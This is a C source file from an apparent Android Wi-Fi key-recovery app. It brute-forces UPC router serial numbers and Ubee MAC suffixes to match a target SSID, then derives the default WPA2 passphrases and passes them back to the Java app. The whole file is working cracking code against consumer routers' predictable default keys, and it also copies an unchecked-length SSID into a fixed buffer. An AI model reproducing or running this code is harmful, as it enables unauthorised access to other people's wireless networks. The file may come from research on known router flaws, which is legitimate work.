#include <android/log.h>
#include <ctype.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "upc_keys_wrapper.h"
#include "upc_keys.h"
#include "md5.h"

// Logging
#define LOG_TAG "upc_keys"
#define DPRINTF(...)  __android_log_print(ANDROID_LOG_DEBUG,LOG_TAG,__VA_ARGS__)
#define IPRINTF(...)  __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define EPRINTF(...)  __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)

JNIEXPORT void JNICALL Java_net_yolosec_upckeygen_algorithms_UpcKeygen_upcNative
        (JNIEnv * env, jobject obj, jbyteArray ess, jint mode)
{
  // Get stopRequested - cancellation flag.
  jclass cls = (*env)->GetObjectClass(env, obj);
  jfieldID fid_s = (*env)->GetFieldID(env, cls, "stopRequested", "Z");
  if (fid_s == NULL) {
    return; /* exception already thrown */
  }
  unsigned char stop = (*env)->GetBooleanField(env, obj, fid_s);

  // Monitoring methods
  jmethodID on_key_computed = (*env)->GetMethodID(env, cls, "onKeyComputed", "(Ljava/lang/String;Ljava/lang/String;II)V");
  jmethodID on_progressed = (*env)->GetMethodID(env, cls, "onProgressed", "(D)V");
  if (on_key_computed == NULL || on_progressed == NULL){
    return;
  }

  // ESSID reading from parameter.
  jbyte *e_native = (*env)->GetByteArrayElements(env, ess, 0);
  jsize e_ssid_len = (*env)->GetArrayLength(env, ess);
  char * e_ssid = (char*) e_native;
  char e_ssid_nullterm[24];
  strncpy(e_ssid_nullterm, e_ssid, e_ssid_len);

  // Definitions.
  int matched[2], mx;
  uint32_t buf[4], target;
  char serial[64];
  char pass[9];
  const char * serial_prefixes[] = { "SAAP", "SAPP", "SBAP" };
  const int prefixes_cnt = (sizeof(serial_prefixes)/sizeof(serial_prefixes[0]));
  uint32_t i, cnt=0, pidx;

  target = strtoul(e_ssid_nullterm + 3, NULL, 0);
  IPRINTF("Computing UPC keys for essid [%s], target %lu, mode: %d, ssid len: %d", e_ssid_nullterm, (unsigned long)target, mode, (int)e_ssid_len);
  unsigned long stop_ctr = 0;
  unsigned long iter_ctr = 0;

  // Compute - from upc_keys.c
  for (buf[0] = 0; buf[0] <= MAX0; buf[0]++) {
    for (buf[1] = 0; buf[1] <= MAX1; buf[1]++) {
      for (buf[2] = 0; buf[2] <= MAX2; buf[2]++) {
        for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
          // Check cancellation signal & progress monitoring.
          stop_ctr += 1;
          iter_ctr += 1;
          if (stop_ctr > (MAX_ITERATIONS/2000)){
            stop_ctr = 0;
            stop = (*env)->GetBooleanField(env, obj, fid_s);
            if (stop) {
              break;
            }

            double current_progress = (double)iter_ctr / MAX_ITERATIONS;
            (*env)->CallVoidMethod(env, obj, on_progressed, (jdouble)current_progress);
          }

          matched[0]= (mode & 1) && upc_generate_ssid(buf, MAGIC_24GHZ) == target;
          matched[1]= (mode & 2) && upc_generate_ssid(buf, MAGIC_5GHZ) == target;
          if (!matched[0] && !matched[1]){
            continue;
          }

          for(pidx=0; pidx < prefixes_cnt; ++pidx){
            sprintf(serial, "%s%d%02d%d%04d", serial_prefixes[pidx], buf[0], buf[1], buf[2], buf[3]);

            // For matched mode compute passwords.
            for(mx=0; mx<2; mx++){
              if (matched[mx]==0){
                continue;
              }

              cnt++;
              compute_wpa2(mx+1, serial, pass);
              IPRINTF("  -> #%02d WPA2 phrase for '%s' = '%s', mode: %d", cnt, serial, pass, mx+1);

              jstring jpass = (*env)->NewStringUTF(env, pass);
              jstring jserial = (*env)->NewStringUTF(env, serial);
              (*env)->CallVoidMethod(env, obj, on_key_computed, jpass, jserial, (jint)mx+1, (jint)0);
              (*env)->DeleteLocalRef(env, jpass);
              (*env)->DeleteLocalRef(env, jserial);
            }
          }
        }
      }
    }
  }
}

JNIEXPORT jstring JNICALL Java_net_yolosec_upckeygen_algorithms_UpcKeygen_upcUbeeSsid
        (JNIEnv * env, jobject obj, jbyteArray ess)
{
  // MAC reading from parameter.
  jbyte *e_native = (*env)->GetByteArrayElements(env, ess, 0);
  char * e_mac = (char*) e_native;
  unsigned char ssid[100];

  ubee_generate_ssid((unsigned char *)e_mac, ssid, NULL);
  return (*env)->NewStringUTF(env, (char*)ssid);
}

JNIEXPORT jstring JNICALL Java_net_yolosec_upckeygen_algorithms_UpcKeygen_upcUbeePass
        (JNIEnv * env, jobject obj, jbyteArray ess)
{
  // MAC reading from parameter.
  jbyte *e_native = (*env)->GetByteArrayElements(env, ess, 0);
  char * e_mac = (char*) e_native;
  unsigned char pass[100];

  ubee_generate_pass((unsigned char *)e_mac, pass, NULL);
  return (*env)->NewStringUTF(env, (char*)pass);
}

JNIEXPORT void JNICALL Java_net_yolosec_upckeygen_algorithms_UpcKeygen_upcUbeeSsidFind
        (JNIEnv * env, jobject obj, jbyteArray ess)
{
  // Get stopRequested - cancellation flag.
  jclass cls = (*env)->GetObjectClass(env, obj);
  jfieldID fid_s = (*env)->GetFieldID(env, cls, "stopRequested", "Z");
  if (fid_s == NULL) {
    return; /* exception already thrown */
  }
  unsigned char stop = (*env)->GetBooleanField(env, obj, fid_s);

  // Monitoring methods
  jmethodID on_key_computed = (*env)->GetMethodID(env, cls, "onKeyComputed", "(Ljava/lang/String;Ljava/lang/String;II)V");
  jmethodID on_progressed = (*env)->GetMethodID(env, cls, "onProgressed", "(D)V");
  if (on_key_computed == NULL || on_progressed == NULL){
    return;
  }

  // ESSID reading from parameter.
  jbyte *e_native = (*env)->GetByteArrayElements(env, ess, 0);
  jsize e_ssid_len = (*env)->GetArrayLength(env, ess);
  char * e_ssid = (char*) e_native;

  IPRINTF("Computing UPC UBEE keys for essid [%.*s]", e_ssid_len, e_ssid);
  unsigned long stop_ctr = 0;
  unsigned long iter_ctr = 0;
  unsigned char mac[] = {0x64, 0x7c, 0x34, 0x0, 0x0, 0x0};
  unsigned char ssid_cmp[12];
  unsigned char pass[12] = {0,0,0,0,0,0,0,0,0,0,0,0};
  char mac_str[20];
  uint32_t buf[3];
  int cnt = 0;
  const long MAX_ITERATIONS_UBEE = 16777216;

  // Compute - from upc_keys.c
  for (buf[0] = 0; buf[0] <= 0xff; buf[0]++) {
    for (buf[1] = 0; buf[1] <= 0xff; buf[1]++) {
      for (buf[2] = 0; buf[2] <= 0xff; buf[2]++) {
          // Check cancellation signal & progress monitoring.
          stop_ctr += 1;
          iter_ctr += 1;
          if (stop_ctr > (MAX_ITERATIONS_UBEE/2000)){
            stop_ctr = 0;
            stop = (*env)->GetBooleanField(env, obj, fid_s);
            if (stop) {
              break;
            }

            double current_progress = (double)iter_ctr / MAX_ITERATIONS_UBEE;
            (*env)->CallVoidMethod(env, obj, on_progressed, (jdouble)current_progress);
          }

          mac[3] = buf[0];
          mac[4] = buf[1];
          mac[5] = buf[2];
          ubee_generate_ssid(mac, ssid_cmp, NULL);
          if ((unsigned)ssid_cmp[3] == (unsigned)e_ssid[3]
           && (unsigned)ssid_cmp[4] == (unsigned)e_ssid[4]
           && (unsigned)ssid_cmp[5] == (unsigned)e_ssid[5]
           && (unsigned)ssid_cmp[6] == (unsigned)e_ssid[6]
           && (unsigned)ssid_cmp[7] == (unsigned)e_ssid[7]
           && (unsigned)ssid_cmp[8] == (unsigned)e_ssid[8]
           && (unsigned)ssid_cmp[9] == (unsigned)e_ssid[9])
         {
           cnt++;
           ubee_generate_pass(mac, pass, NULL);
           sprintf(mac_str, "64:7c:34:%02x:%02x:%02x", mac[3], mac[4], mac[5]);

           IPRINTF("  -> #%02d WPA2 UBEE phrase for SSID '%.*s' pass '%s', mac %s",
             cnt, e_ssid_len, e_ssid, pass, mac_str);

           jstring jpass = (*env)->NewStringUTF(env, pass);
           jstring jmac = (*env)->NewStringUTF(env, mac_str);
           (*env)->CallVoidMethod(env, obj, on_key_computed, jpass, jmac, (jint)0, (jint)0);
           (*env)->DeleteLocalRef(env, jpass);
           (*env)->DeleteLocalRef(env, jmac);
         }
      }
    }
  }
}
